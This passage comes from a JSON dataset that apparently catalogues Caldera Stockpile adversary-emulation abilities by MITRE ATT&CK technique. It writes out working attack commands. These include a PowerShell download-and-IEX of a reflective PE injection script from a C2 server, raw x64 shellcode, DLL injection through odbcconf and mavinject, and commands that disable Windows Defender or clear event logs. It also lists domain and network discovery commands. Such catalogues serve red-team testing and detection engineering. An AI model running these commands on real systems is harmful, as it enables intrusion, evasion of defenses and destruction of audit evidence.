System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"shared.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.process.id"}]}]}}], "command_list": ["$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"shared.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1055", "commands": [{"source": "data/abilities/defense-evasion/a42dfc86-12f0-4f06-b0cf-24830c7f61f4.yml", "command": "0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3", "name": "Start a new calculator process"}], "parsed_datasets": [{"Mitre Stockpile - Start a new calculator process": {"id": "a42dfc86-12f0-4f06-b0cf-24830c7f61f4", "name": "Spawn calculator (shellcode)", "description": "Start a new calculator process", "tactic": "defense-evasion", "technique": {"attack_id": "T1055", "name": "Process Injection"}, "platforms": {"windows": {"shellcode_amd64": {"command": "0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3"}}}}}], "command_list": ["0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1055.001", "commands": [{"source": "data/abilities/defense-evasion/a74bc239-a196-4f7e-8d5c-fe8c0266071c.yml", "command": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}\n", "name": "Leverage odbcconf for DLL injection"}], "parsed_datasets": [{"Mitre Stockpile - Leverage odbcconf for DLL injection": {"id": "a74bc239-a196-4f7e-8d5c-fe8c0266071c", "name": "Signed Binary Execution - odbcconf", "description": "Leverage odbcconf for DLL injection", "tactic": "defense-evasion", "technique": {"attack_id": "T1055.001", "name": "Process Injection: Dynamic-link Library Injection"}, "platforms": {"windows": {"psh": {"command": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}\n"}}}}}], "command_list": ["odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1562.001", "commands": [{"source": "data/abilities/defense-evasion/b007f6e8-4a87-4440-8888-29ceab047d9b.yml", "command": "Set-MpPreference -DisableIntrusionPreventionSystem $true;\nSet-MpPreference -DisableIOAVProtection $true;\nSet-MpPreference -DisableRealtimeMonitoring $true;\nSet-MpPreference -DisableScriptScanning $true;\nSet-MpPreference -EnableControlledFolderAccess Disabled;\n", "name": "Disable Windows Defender All"}], "parsed_datasets": [{"Mitre Stockpile - Disable Windows Defender All": {"id": "b007f6e8-4a87-4440-8888-29ceab047d9b", "name": "Disable Windows Defender All", "description": "Disable Windows Defender All", "tactic": "defense-evasion", "technique": {"attack_id": "T1562.001", "name": "Impair Defenses: Disable or Modify Tools"}, "privilege": "Elevated", "platforms": {"windows": {"psh": {"command": "Set-MpPreference -DisableIntrusionPreventionSystem $true;\nSet-MpPreference -DisableIOAVProtection $true;\nSet-MpPreference -DisableRealtimeMonitoring $true;\nSet-MpPreference -DisableScriptScanning $true;\nSet-MpPreference -EnableControlledFolderAccess Disabled;\n", "cleanup": "Set-MpPreference -DisableIntrusionPreventionSystem $false;\nSet-MpPreference -DisableIOAVProtection $false;\nSet-MpPreference -DisableRealtimeMonitoring $false;\nSet-MpPreference -DisableScriptScanning $false;\nSet-MpPreference -EnableControlledFolderAccess Enabled;\n"}}}}}], "command_list": ["Set-MpPreference -DisableIntrusionPreventionSystem $true;\nSet-MpPreference -DisableIOAVProtection $true;\nSet-MpPreference -DisableRealtimeMonitoring $true;\nSet-MpPreference -DisableScriptScanning $true;\nSet-MpPreference -EnableControlledFolderAccess Disabled;"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1055.002", "commands": [{"source": "data/abilities/defense-evasion/e5bcefee-262d-4568-a261-e8a20855ec81.yml", "command": "$explorer = Get-Process -Name explorer;\nmavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll\n", "name": "Leverage Mavinject (signed binary) for DLL injection"}], "parsed_datasets": [{"Mitre Stockpile - Leverage Mavinject (signed binary) for DLL injection": {"id": "e5bcefee-262d-4568-a261-e8a20855ec81", "name": "Signed Binary Execution - Mavinject", "description": "Leverage Mavinject (signed binary) for DLL injection", "tactic": "defense-evasion", "technique": {"attack_id": "T1055.002", "name": "Process Injection: Portable Executable Injection"}, "platforms": {"windows": {"psh": {"command": "$explorer = Get-Process -Name explorer;\nmavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll\n"}}}}}], "command_list": ["$explorer = Get-Process -Name explorer;\nmavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1059.001", "commands": [{"source": "data/abilities/defense-evasion/e5f9de8f-3df1-4e78-ad92-a784e3f6770d.yml", "command": "Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;\nC:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;\n", "name": "Copy powershell to non-standard location and perform triage commands"}], "parsed_datasets": [{"Mitre Stockpile - Copy powershell to non-standard location and perform triage commands": {"id": "e5f9de8f-3df1-4e78-ad92-a784e3f6770d", "name": "Move Powershell & triage", "description": "Copy powershell to non-standard location and perform triage commands", "tactic": "defense-evasion", "technique": {"attack_id": "T1059.001", "name": "PowerShell"}, "platforms": {"windows": {"psh": {"command": "Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;\nC:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;\n"}}}}}], "command_list": ["Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;\nC:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1070.001", "commands": [{"source": "data/abilities/defense-evasion/fcf71ee3-d1a9-4136-b919-9e5f6da43608.yml", "command": "Clear-Eventlog Security;\nClear-Eventlog System;\n", "name": "Clear Sysmon logs [intended to trigger CAR-2016-04-002]"}], "parsed_datasets": [{"Mitre Stockpile - Clear Sysmon logs [intended to trigger CAR-2016-04-002]": {"id": "fcf71ee3-d1a9-4136-b919-9e5f6da43608", "name": "Clear Logs", "description": "Clear Sysmon logs [intended to trigger CAR-2016-04-002]", "tactic": "defense-evasion", "technique": {"attack_id": "T1070.001", "name": "Indicator Removal on Host: Clear Windows Event Logs"}, "privilege": "Elevated", "platforms": {"windows": {"psh,pwsh": {"command": "Clear-Eventlog Security;\nClear-Eventlog System;\n"}}}}}], "command_list": ["Clear-Eventlog Security;\nClear-Eventlog System;"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1018", "commands": [{"source": "data/abilities/discovery/0360ede1-3c28-48d3-a6ef-6e98f562c5af.yml", "command": "Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer\n", "name": "Get a list of all computers in a domain"}, {"source": "data/abilities/discovery/13379ae1-d20e-4162-91f8-320d78a35e7f.yml", "command": "Import-Module .\\powerview.ps1;\nGet-DomainComputer\n", "name": "Use PowerView to query the Active Directory server for a list of computers in the Domain"}, {"source": "data/abilities/discovery/26c8b8b5-7b5b-4de1-a128-7d37fb14f517.yml", "command": "nltest /dsgetdc:%USERDOMAIN%\n", "name": "Identify the remote domain controllers"}, {"source": "data/abilities/discovery/26c8b8b5-7b5b-4de1-a128-7d37fb14f517.yml", "command": "nltest /dsgetdc:$env:USERDOMAIN\n", "name": "Identify the remote domain controllers"}, {"source": "data/abilities/discovery/5f77ecf9-613f-4863-8d2f-ed6b447a4633.yml", "command": "cat ~/.ssh/known_hosts\n", "name": "View the known_hosts file"}, {"source": "data/abilities/discovery/5f77ecf9-613f-4863-8d2f-ed6b447a4633.yml", "command": "cat ~/.ssh/known_hosts\n", "name": "View the known_hosts file"}, {"source": "data/abilities/discovery/85341c8c-4ecb-4579-8f53-43e3e91d7617.yml", "command": "arp -a", "name": "Locate all active IP and FQDNs on the network"}, {"source": "data/abilities/discovery/85341c8c-4ecb-4579-8f53-43e3e91d7617.yml", "command": "arp -a", "name": "Locate all active IP and FQDNs on the network"}, {"source": "data/abilities/discovery/85341c8c-4ecb-4579-8f53-43e3e91d7617.yml", "command": "arp -a", "name": "Locate all active IP and FQDNs on the network"}, {"source": "data/abilities/discovery/b22b3b47-6219-4504-a2e6-ae8263e49fc3.yml", "command": "nltest /dsgetdc:%USERDOMAIN%\n", "name": "Identify remote domain controller"}, {"source": "data/abilities/discovery/b22b3b47-6219-4504-a2e6-ae8263e49fc3.yml", "command": "nltest /dsgetdc:$env:USERDOMAIN\n", "name": "Identify remote domain controller"}, {"source": "data/abilities/discovery/ce485320-41a4-42e8-a510-f5a8fe96a644.yml", "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev", "name": "Identify the organizations mail server"}, {"source": "data/abilities/discovery/ce485320-41a4-42e8-a510-f5a8fe96a644.yml", "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev", "name": "Identify the organizations mail server"}, {"source": "data/abilities/discovery/ce485320-41a4-42e8-a510-f5a8fe96a644.yml", "command": "(nslookup -querytype=mx #{target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()\n", "name": "Identify the organizations mail server"}, {"source": "data/abilities/discovery/fa4ed735-7006-4451-a578-b516f80e559f.yml", "command": "nslookup #{remote.host.ip}\n", "name": "Find hostname of remote IP in domain"}, {"source": "data/abilities/discovery/fdf8bf36-797f-4157-805b-fe7c1c6fc903.yml", "command": "nbtstat -A #{remote.host.ip}", "name": "Find hostname of remote host"}], "parsed_datasets": [{"Mitre Stockpile - Get a list of all computers in a domain": {"id": "0360ede1-3c28-48d3-a6ef-6e98f562c5af", "name": "GetComputers (Alice)", "description": "Get a list of all computers in a domain", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "platforms": {"windows": {"psh": {"command": "Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer\n", "payloads": ["powerview.ps1"]}}}}}, {"Mitre Stockpile - Use PowerView to query the Active Directory server for a list of computers in the Domain": {"id": "13379ae1-d20e-4162-91f8-320d78a35e7f", "name": "Discover local hosts", "description": "Use PowerView to query the Active Directory server for a list of computers in the Domain", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "platforms": {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1;\nGet-DomainComputer\n", "parsers": {"plugins.stockpile.app.parsers.gdomain": [{"source": "remote.host.fqdn"}]}, "payloads": ["powerview.ps1"]}}}}}, {"Mitre Stockpile - Identify the remote domain controllers": {"id": "26c8b8b5-7b5b-4de1-a128-7d37fb14f517", "name": "Discover domain controller", "description": "Identify the remote domain controllers", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "platforms": {"windows": {"cmd": {"command": "nltest /dsgetdc:%USERDOMAIN%\n"}, "psh": {"command": "nltest /dsgetdc:$env:USERDOMAIN\n"}}}}}, {"Mitre Stockpile - View the known_hosts file": {"id": "5f77ecf9-613f-4863-8d2f-ed6b447a4633", "name": "Parse SSH known_hosts", "description": "View the known_hosts file", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "platforms": {"darwin": {"sh": {"command": "cat ~/.ssh/known_hosts\n"}}, "linux": {"sh": {"command": "cat ~/.ssh/known_hosts\n"}}}}}, {"Mitre Stockpile - Locate all active IP and FQDNs on the network": {"id": "85341c8c-4ecb-4579-8f53-43e3e91d7617", "name": "Collect ARP details", "description": "Locate all active IP and FQDNs on the network", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "platforms": {"darwin": {"sh": {"command": "arp -a", "parsers": {"plugins.stockpile.app.parsers.ipaddr": [{"source": "remote.host.ip"}]}}}, "linux": {"sh": {"command": "arp -a", "parsers": {"plugins.stockpile.app.parsers.ipaddr": [{"source": "remote.host.ip"}]}}}, "windows": {"psh,cmd": {"command": "arp -a", "parsers": {"plugins.stockpile.app.parsers.ipaddr": [{"source": "remote.host.ip"}]}}}}}}, {"Mitre Stockpile - Identify remote domain controller": {"id": "b22b3b47-6219-4504-a2e6-ae8263e49fc3", "name": "Find domain controller", "description": "Identify remote domain controller", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "platforms": {"windows": {"cmd": {"command": "nltest /dsgetdc:%USERDOMAIN%\n"}, "psh": {"command": "nltest /dsgetdc:$env:USERDOMAIN\n"}}}}}, {"Mitre Stockpile - Identify the organizations mail server": {"id": "ce485320-41a4-42e8-a510-f5a8fe96a644", "name": "Discover Mail Server", "description": "Identify the organizations mail server", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "platforms": {"linux": {"sh": {"command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}}}, "darwin": {"sh": {"command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}}}, "windows": {"psh": {"command": "(nslookup -querytype=mx #{target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}}}}}}, {"Mitre Stockpile - Find hostname of remote IP in domain": {"id": "fa4ed735-7006-4451-a578-b516f80e559f", "name": "Reverse nslookup IP", "description": "Find hostname of remote IP in domain", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "platforms": {"windows": {"psh": {"command": "nslookup #{remote.host.ip}\n", "parsers": {"plugins.stockpile.app.parsers.reverse_nslookup": [{"source": "remote.host.fqdn", "edge": "has_ip", "target": "remote.host.ip"}]}}}}}}, {"Mitre Stockpile - Find hostname of remote host": {"id": "fdf8bf36-797f-4157-805b-fe7c1c6fc903", "name": "Find Hostname", "description": "Find hostname of remote host", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "platforms": {"windows": {"psh": {"command": "nbtstat -A #{remote.host.ip}"}}}}}], "command_list": ["Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer", "Import-Module .\\powerview.ps1;\nGet-DomainComputer", "nltest /dsgetdc:$env:USERDOMAIN", "nltest /dsgetdc:%USERDOMAIN%", "cat ~/.ssh/known_hosts", "arp -a", "nltest /dsgetdc:$env:USERDOMAIN", "nltest /dsgetdc:%USERDOMAIN%", "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev", "(nslookup -querytype=mx #{target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()", "nslookup #{remote.host.ip}", "nbtstat -A #{remote.host.ip}"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1016", "commands": [{"source": "data/abilities/discovery/14a21534-350f-4d83-9dd7-3c56b93a0c17.yml", "command": "nbtstat -n\n", "name": "Find Domain information"}, {"source": "data/abilities/discovery/9a30740d-3aa8-4c23-8efa-d51215e8a5b9.yml", "command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n", "name": "View all potential WIFI networks on host"}, {"source": "data/abilities/discovery/9a30740d-3aa8-4c23-8efa-d51215e8a5b9.yml", "command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n", "name": "View all potential WIFI networks on host"}, {"source": "data/abilities/discovery/9a30740d-3aa8-4c23-8efa-d51215e8a5b9.yml", "command": ".\\#{payload:28f9bf43-4f14-4965-9bd9-b70fd6993d8e} -Scan\n", "name": "View all potential WIFI networks on host"}, {"source": "data/abilities/discovery/a0676fe1-cd52-482e-8dde-349b73f9aa69.yml", "command": "./wifi.sh pref\n", "name": "See the most used WIFI networks of a machine"}, {"source": "data/abilities/discovery/a0676fe1-cd52-482e-8dde-349b73f9aa69.yml", "command": "./wifi.sh pref\n", "name": "See the most used WIFI networks of a machine"}, {"source": "data/abilities/discovery/a0676fe1-cd52-482e-8dde-349b73f9aa69.yml", "command": ".\\wifi.ps1 -Pref\n", "name": "See the most used WIFI networks of a machine"}, {"source": "data/abilities/discovery/ac9dce33-2acc-4b34-94ce-2596409ce8f0.yml", "command": "for ip in $(seq 190 199); do ping -c 1 $(echo #{domain.broadcast.ip} |\ncut -d. -f-3).$ip -W 1; done\n", "name": "Ping the network in order to build the ARP cache"}, {"source": "data/abilities/discovery/b6f545ef-f802-4537-b59d-2cb19831c8ed.yml", "command": "ifconfig | grep broadcast", "name": "Capture the local network broadcast IP address"}, {"source": "data/abilities/discovery/e8017c46-acb8-400c-a4b5-b3362b5b5baa.yml", "command": "sudo ifconfig\n", "name": "View network configuration info for host"}, {"source": "data/abilities/discovery/e8017c46-acb8-400c-a4b5-b3362b5b5baa.yml", "command": "sudo ifconfig\n", "name": "View network configuration info for host"}, {"source": "data/abilities/discovery/e8017c46-acb8-400c-a4b5-b3362b5b5baa.yml", "command": "ipconfig\n", "name": "View network configuration info for host"}], "parsed_datasets": [{"Mitre Stockpile - Find Domain information": {"id": "14a21534-350f-4d83-9dd7-3c56b93a0c17", "name": "Find Domain", "description": "Find Domain information", "tactic": "discovery", "technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "platforms": {"windows": {"psh": {"command": "nbtstat -n\n", "parsers": {"plugins.stockpile.app.parsers.nbtstat": [{"source": "network.domain.name"}]}}}}}}, {"Mitre Stockpile - View all potential WIFI networks on host": {"id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9", "name": "Scan WIFI networks", "description": "View all potential WIFI networks on host", "tactic": "discovery", "technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "platforms": {"darwin": {"sh": {"command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n", "payloads": ["9f639067-370a-40ba-b7ac-6f1c15d5a158"]}}, "linux": {"sh": {"command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n", "payloads": ["9f639067-370a-40ba-b7ac-6f1c15d5a158"]}}, "windows": {"psh": {"command": ".\\#{payload:28f9bf43-4f14-4965-9bd9-b70fd6993d8e} -Scan\n", "payloads": ["28f9bf43-4f14-4965-9bd9-b70fd6993d8e"]}}}}}, {"Mitre Stockpile - See the most used WIFI networks of a machine": {"id": "a0676fe1-cd52-482e-8dde-349b73f9aa69", "name": "Preferred WIFI", "description": "See the most used WIFI networks of a machine", "tactic": "discovery", "technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "platforms": {"darwin": {"sh": {"command": "./wifi.sh pref\n", "payloads": ["wifi.sh"], "parsers": {"plugins.stockpile.app.parsers.wifipref": [{"source": "wifi.network.ssid"}]}}}, "linux": {"sh": {"command": "./wifi.sh pref\n", "payloads": ["wifi.sh"], "parsers": {"plugins.stockpile.app.parsers.wifipref": [{"source": "wifi.network.ssid"}]}}}, "windows": {"psh": {"command": ".\\wifi.ps1 -Pref\n", "payloads": ["wifi.ps1"], "parsers": {"plugins.stockpile.app.parsers.wifipref": [{"source": "wifi.network.ssid"}]}}}}}}, {"Mitre Stockpile - Ping the network in order to build the ARP cache": {"id": "ac9dce33-2acc-4b34-94ce-2596409ce8f0", "name": "Ping network", "description": "Ping the network in order to build the ARP cache", "tactic": "discovery", "technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "platforms": {"darwin": {"sh": {"command": "for ip in $(seq 190 199); do ping -c 1 $(echo #{domain.broadcast.ip} |\ncut -d. -f-3).$ip -W 1; done\n"}}}}}, {"Mitre Stockpile - Capture the local network broadcast IP address": {"id": "b6f545ef-f802-4537-b59d-2cb19831c8ed", "name": "Snag broadcast IP", "description": "Capture the local network broadcast IP address", "tactic": "discovery", "technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "platforms": {"darwin": {"sh": {"command": "ifconfig | grep broadcast"}}}}}, {"Mitre Stockpile - View network configuration info for host": {"id": "e8017c46-acb8-400c-a4b5-b3362b5b5baa", "name": "Network Interface Configuration", "description": "View network configuration info for host", "tactic": "discovery", "technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "platforms": {"darwin": {"sh": {"command": "sudo ifconfig\n"}}, "linux": {"sh": {"command": "sudo ifconfig\n"}}, "windows": {"psh": {"command": "ipconfig\n"}}}}}], "command_list": ["nbtstat -n", "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan", ".\\#{payload:28f9bf43-4f14-4965-9bd9-b70fd6993d8e} -Scan", "./wifi.sh pref", ".\\wifi.ps1 -Pref", "for ip in $(seq 190 199); do ping -c 1 $(echo #{domain.broadcast.ip} |\ncut -d. -f-3).$ip -W 1; done", "ifconfig | grep broadcast", "sudo ifconfig", "ipconfig"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1083", "commands": [{"source": "data/abilities/discovery/1c353eb4-29ab-4dfe-88ed-f34f5a60848e.yml", "command": "Get-ChildItem -Path #{host.system.path}\n", "name": "Find or discover files on the file system"}, {"source": "data/abilities/discovery/52177cc1-b9ab-4411-ac21-2eadc4b5d3b8.yml", "command": "ls\n", "name": "List contents of current directory"}, {"source": "data/abilities/discovery/52177cc1-b9ab-4411-ac21-2eadc4b5d3b8.yml", "command": "ls\n", "name": "List contents of current directory"}, {"source": "data/abilities/discovery/52177cc1-b9ab-4411-ac21-2eadc4b5d3b8.yml", "command": "dir\n", "name": "List contents of current directory"}, {"source": "data/abilities/discovery/6e1a53c0-7352-4899-be35-fa7f364d5722.yml", "command": "pwd\n", "name": "Print the current working directory on the system"}, {"source": "data/abilities/discovery/6e1a53c0-7352-4899-be35-fa7f364d5722.yml", "command": "pwd\n", "name": "Print the current working directory on the system"}, {"source": "data/abilities/discovery/6e1a53c0-7352-4899-be35-fa7f364d5722.yml", "command": "pwd\n", "name": "Print the current working directory on the system"}], "parsed_datasets": [{"Mitre Stockpile - Find or discover files on the file system": {"id": "1c353eb4-29ab-4dfe-88ed-f34f5a60848e", "name": "File and Directory Discovery", "description": "Find or discover files on the file system", "tactic": "discovery", "technique": {"attack_id": "T1083", "name": "File and Directory Discovery"}, "platforms": {"windows": {"psh": {"command": "Get-ChildItem -Path #{host.system.path}\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.system.path"}]}]}}, {"Mitre Stockpile - List contents of current directory": {"id": "52177cc1-b9ab-4411-ac21-2eadc4b5d3b8", "name": "List Directory", "description": "List contents of current directory", "tactic": "discovery", "technique": {"attack_id": "T1083", "name": "File and Directory Discovery"}, "platforms": {"darwin": {"sh": {"command": "ls\n"}}, "linux": {"sh": {"command": "ls\n"}}, "windows": {"psh": {"command": "dir\n"}}}}}, {"Mitre Stockpile - Print the current working directory on the system": {"id": "6e1a53c0-7352-4899-be35-fa7f364d5722", "name": "Print Working Directory", "description": "Print the current working directory on the system", "tactic": "discovery", "technique": {"attack_id": "T1083", "name": "File and Directory Discovery"}, "platforms": {"darwin": {"sh": {"command": "pwd\n"}}, "linux": {"sh": {"command": "pwd\n"}}, "windows": {"psh": {"command": "pwd\n"}}}}}], "command_list": ["Get-ChildItem -Path #{host.system.path}", "dir", "ls", "pwd"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1012", "commands": [{"source": "data/abilities/discovery/2488245e-bcbd-405d-920e-2de27db882b3.yml", "command": "Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n", "name": "Query Registry using PowerShell Get-ItemProperty"}], "parsed_datasets": [{"Mitre Stockpile - Query Registry using PowerShell Get-ItemProperty": {"id": "2488245e-bcbd-405d-920e-2de27db882b3", "name": "Query Registry", "description": "Query Registry using PowerShell Get-ItemProperty", "tactic": "discovery", "technique": {"attack_id": "T1012", "name": "Query Registry"}, "platforms": {"windows": {"psh": {"command": "Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n"}}}}}], "command_list": ["Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1082", "commands": [{"source": 